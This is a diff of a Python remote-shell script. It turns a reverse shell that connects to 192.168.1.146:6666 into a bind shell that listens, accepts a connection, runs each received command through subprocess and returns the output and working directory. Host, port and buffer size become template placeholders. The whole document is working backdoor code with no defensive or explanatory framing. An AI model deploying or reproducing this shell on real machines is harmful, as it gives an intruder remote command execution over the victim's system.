@@ -4,22 +4,24 @@ import socket
 import os
 import subprocess
 
-SERVER_HOST = "192.168.1.146"
-SERVER_PORT = 6666
-BUFFER_SIZE = 4096
+SERVER_HOST = {IP}
+SERVER_PORT = {PORT}
+BUFFER_SIZE = {BUFFER_SZIE}
 SEPARATOR = "<sep>"
 s = socket.socket()
-s.connect((SERVER_HOST, SERVER_PORT))
+s.bind((SERVER_HOST, SERVER_PORT))
+s.listen(5)
+client_socket, client_address = s.accept()
 tout = subprocess.getoutput("ls")
 if ('recognized' not in tout):
-    s.send('linux'.encode())
+    client_socket.send('linux'.encode())
 else:
-    s.send('windows'.encode())
+    client_socket.send('windows'.encode())
 del tout
 cwd = os.getcwd()
-s.send(cwd.encode())
+client_socket.send(cwd.encode())
 while True:
-    command = s.recv(BUFFER_SIZE).decode()
+    command = client_socket.recv(BUFFER_SIZE).decode()
     splited_command = command.split()
     if command.lower() == "exit":
         break
@@ -34,5 +36,4 @@ while True:
         output = subprocess.getoutput(command)
     cwd = os.getcwd()
     message = f"{output}{SEPARATOR}{cwd}"
-    s.send(message.encode())
-s.close()
+    client_socket.send(message.encode())
